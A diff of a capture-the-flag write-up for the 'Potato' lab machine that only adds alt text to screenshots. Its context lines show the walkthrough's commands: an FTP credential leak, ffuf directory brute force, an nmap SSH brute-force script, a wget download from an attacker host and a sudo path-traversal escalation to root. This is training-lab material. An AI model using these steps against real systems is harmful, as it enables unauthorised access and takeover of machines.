@@ -34,7 +34,7 @@ nmap -A -p- TARGET -oN potato.nmap --min-rate 10000
 | 80       | http        |
 | 2112     | ftp         |
 
-![](https://cdn.ziomsec.com/potato/1.webp)
+![performing an nmap scan on potato machine](https://cdn.ziomsec.com/potato/1.webp)
 
 ## Initial Foothold
 
@@ -47,7 +47,7 @@ ftp -P 2112 TARGET
 > get welcome.msg welcome.msg
 ```
 
-![](https://cdn.ziomsec.com/potato/2.webp)
+![interacting the ftp server](https://cdn.ziomsec.com/potato/2.webp)
 
 The `index.php.bak` file revealed login credentials for *admin*.
 
@@ -55,11 +55,11 @@ The `index.php.bak` file revealed login credentials for *admin*.
 cat ftp/index.php.bak
 ```
 
-![](https://cdn.ziomsec.com/potato/3.webp)
+![reading backup file](https://cdn.ziomsec.com/potato/3.webp)
 
 I then visited the web application but found nothing on the home page.
 
-![](https://cdn.ziomsec.com/potato/4.webp)
+![accessing the web application](https://cdn.ziomsec.com/potato/4.webp)
 
 I performed a web directory brute force using **ffuf** to find hidden directories and found 2 directories, `admin` and `potato`.
 
@@ -67,33 +67,33 @@ I performed a web directory brute force using **ffuf** to find hidden directorie
 ffuf -u http://TARGET/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt -mc 200,301
 ```
 
-![](https://cdn.ziomsec.com/potato/5.webp)
+![performing a directory bruteforce](https://cdn.ziomsec.com/potato/5.webp)
 
 I visited both the endpoints and found a login panel at */admin*
 
-![](https://cdn.ziomsec.com/potato/6.webp)
+![visiting discovered endpoint](https://cdn.ziomsec.com/potato/6.webp)
 
-![](https://cdn.ziomsec.com/potato/7.webp)
+![visiting discovered endpoint](https://cdn.ziomsec.com/potato/7.webp)
 
 I tried logging in using the username and password that I had found but failed.
 
-![](https://cdn.ziomsec.com/potato/8.webp)
+![trying to log in](https://cdn.ziomsec.com/potato/8.webp)
 
 The login mechanism used `strcmp` to check whether the username and password were correct.  So I looked for ways to bypass `strcmp`.
 
-![](https://cdn.ziomsec.com/potato/9.webp)
+![analyzing the backup](https://cdn.ziomsec.com/potato/9.webp)
 
-![](https://cdn.ziomsec.com/potato/10.webp)
+![searching for filter bypass](https://cdn.ziomsec.com/potato/10.webp)
 
-![](https://cdn.ziomsec.com/potato/11.webp)
+![searching for filter bypass](https://cdn.ziomsec.com/potato/11.webp)
 
 Hence if I modified the password parameter, I could potentially bypass the security check. To try it out, I fired up **burp suite** and captured a login request. I then changed the `password` parameter as show below and forwarded the request.
 
-![](https://cdn.ziomsec.com/potato/12.webp)
+![exploiting filter bypass](https://cdn.ziomsec.com/potato/12.webp)
 
 Hence I got access to the admin area but found nothing useful here.
 
-![](https://cdn.ziomsec.com/potato/13.webp)
+![accessng admin area](https://cdn.ziomsec.com/potato/13.webp)
 
 As a last resort, I tried to bruteforce **ssh** credentials using **nmap** and succeeded.
 
@@ -101,8 +101,8 @@ As a last resort, I tried to bruteforce **ssh** credentials using **nmap** and s
 nmap -p 22 --script=/usr/share/nmap/scripts/ssh-brute.nse TARGET
 ```
 
-![](https://cdn.ziomsec.com/potato/14.webp)
-![](https://cdn.ziomsec.com/potato/15.webp)
+![bruteforcing ssh credentials](https://cdn.ziomsec.com/potato/14.webp)
+![bruteforcing ssh credentials](https://cdn.ziomsec.com/potato/15.webp)
 
 I used these credentials to log into the system.
 
@@ -111,7 +111,7 @@ ssh webadmin@TARGET
 # enter password
 ```
 
-![](https://cdn.ziomsec.com/potato/16.webp)
+![logging in as webadmin](https://cdn.ziomsec.com/potato/16.webp)
 
 ## Privilege Escalation
 
@@ -122,19 +122,19 @@ $ wget "http://KALI/lse.sh"
 $ chmod +x lse.sh
 ```
 
-![](https://cdn.ziomsec.com/potato/17.webp)
+![downloading linux smart enumeration script](https://cdn.ziomsec.com/potato/17.webp)
 
 I then ran the script to find misconfigurations on the system.
 
-![](https://cdn.ziomsec.com/potato/18.webp)
+![running the lse script](https://cdn.ziomsec.com/potato/18.webp)
 
-![](https://cdn.ziomsec.com/potato/19.webp)
+![running the lse script](https://cdn.ziomsec.com/potato/19.webp)
 
-![](https://cdn.ziomsec.com/potato/20.webp)
+![running the lse script](https://cdn.ziomsec.com/potato/20.webp)
 
 The script revealed I could run a particular command as **sudo** without any password.
 
-![](https://cdn.ziomsec.com/potato/21.webp)
+![sudo privileges](https://cdn.ziomsec.com/potato/21.webp)
 
 I looked for ways to exploit the **nice** binary on **gtfobins** and tried it, however, it failed.
 
@@ -142,9 +142,9 @@ I looked for ways to exploit the **nice** binary on **gtfobins** and tried it, h
 sudo nice /bin/sh
 ```
 
-![](https://cdn.ziomsec.com/potato/22.webp)
+![exploiting sudo privileges](https://cdn.ziomsec.com/potato/22.webp)
 
-![](https://cdn.ziomsec.com/potato/23.webp)
+![exploiting sudo privileges](https://cdn.ziomsec.com/potato/23.webp)
 
 Hence, I could only execute the entire command and not a single binary. Also, I looked inside the **`/notes`** directory and found shell scripts in it. However, due to lack of privilege, I couldn't add or modify any script here. So I used relative path to make it execute a shell script from my home directory.
 
@@ -155,11 +155,11 @@ $ chmod +x shell.sh
 $ sudo /bin/nice /notes/../home/webadmin/shell.sh
 ```
 
-![](https://cdn.ziomsec.com/potato/24.webp)
+![creating a payload and using it to get root access](https://cdn.ziomsec.com/potato/24.webp)
 
 This approach made me a **root** user. I then captured the flag from the `/root` directory.
 
-![](https://cdn.ziomsec.com/potato/25.webp)
+![capturing the root flag](https://cdn.ziomsec.com/potato/25.webp)
 
 ## Closure
 
